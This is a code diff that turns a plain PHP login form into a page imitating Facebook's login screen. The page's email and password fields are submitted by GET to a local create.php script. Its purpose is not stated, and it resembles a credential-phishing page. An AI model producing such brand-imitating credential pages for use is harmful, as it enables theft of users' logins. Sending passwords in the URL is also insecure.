@@ -4,30 +4,48 @@
 	$identifier = getNewIdentifier();
 ?>
 
-<html>
-<header>
-	<link rel="stylesheet" href="style.css">
-</header>
-<body>
-
-		
-	<form action="create.php" method="get">
-	<p>
-		<input type="hidden" name="id" value="<?php echo $identifier['id'];  ?>"/>
-		<div>
-        	<label for="email_or_phone_number">Email or phone :</label>
-        	<input type="text" id="email_or_phone_number" name="email_or_phone_number" value="<?php echo $identifier['email_or_phone_number'];  ?>">
-	    </div>
-	    <div>
-	        <label for="password">Password</label>
-	        <input type="text" id="password" name="password" value="<?php echo $identifier['password'];  ?>">
-	    </div>
-		<div class="button">
-			<button type="submit">CONNEXION</button>
-		</div>
-	</p>
-	</form>
-	<br>
-
-</body>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <link rel="stylesheet" href="./style.css">
+  </head>
+  <body>
+    <div class="container flex">
+      <div class="facebook-page flex">
+        <div class="text">
+          <h1>facebook</h1>
+          <p>Connect with friends and the world </p>
+          <p> around you on Facebook.</p>
+        </div>
+        <form action="create.php" method="get">
+          <input 
+		  	type="email" 
+			placeholder="Email or phone number" 
+			required
+			id="email_or_phone_number" 
+			name="email_or_phone_number" 
+			value="<?php echo $identifier['email_or_phone_number'];  ?>"
+		  >
+          <input 
+		  	type="password" 
+			placeholder="Password" 
+			required
+			id="password" 
+			name="password" 
+			value="<?php echo $identifier['password'];  ?>"
+		  >
+          <div class="link">
+            <button type="submit" class="login">Login</button>
+            <a href="#" class="forgot">Forgot password?</a>
+          </div>
+          <hr>
+          <div class="button">
+            <a href="#">Create new account</a>
+          </div>
+        </form>
+      </div>
+    </div>
+  </body>
 </html>
